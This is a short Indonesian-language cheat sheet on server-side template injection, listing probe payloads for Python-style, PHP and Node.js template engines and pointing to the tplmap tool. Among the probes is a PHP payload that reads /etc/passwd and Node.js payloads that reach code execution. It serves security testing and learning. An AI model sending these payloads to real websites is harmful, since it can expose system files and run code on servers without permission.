# Server-Side Template Injection (SSTI)
## Definisi
Serangan SSTI adalah saat penyerang dapat menggunakan *native template syntax* untuk menginjeksi *payload* berbahaya ke dalam sebuah template, dan akan dieksekusi di sisi server (*server-side*).

## Cara Mencari Kerentanan SSTI
Di setiap input form coba masukkan command berikut:
* {7*7}
* {{ '7'*7 }}
* {{ [].class.base.subclasses()}}
* {{''.class.mro()[1].subclasses()}}
* {% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
* {{ [].__class__.__base__.__subclasses__() }}

Apabila website menggunakan PHP Base, coba command berikut:
* {php}print "Hello"{/php}
* {php}$a = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($a);{/php}

Apabila website menggunakan backend Node.js, coba command berikut:
* {{ this }}-> [Object Object]
* {{ this.__proto__ }}-> [Object Object]
* {{ this.__proto__.constructor.name }}-> Object
* {{this.constructor.constructor}}
* {{this.constructor.constructor('process.pid')()}}

Apabila command-command diatas ada yang tereksekusi, maka kemungkinan target tersebut rentan akan serangan SSTI. 
Sumber :
* https://portswigger.net/web-security/server-side-template-injection
* https://twitter.com/jae_hak99/status/1331967876417327104?s=20


## Tool yang bisa digunakan 
[tplmap](https://github.com/epinna/tplmap)

## Author
[rad1zly](https://github.com/rad1zly/)
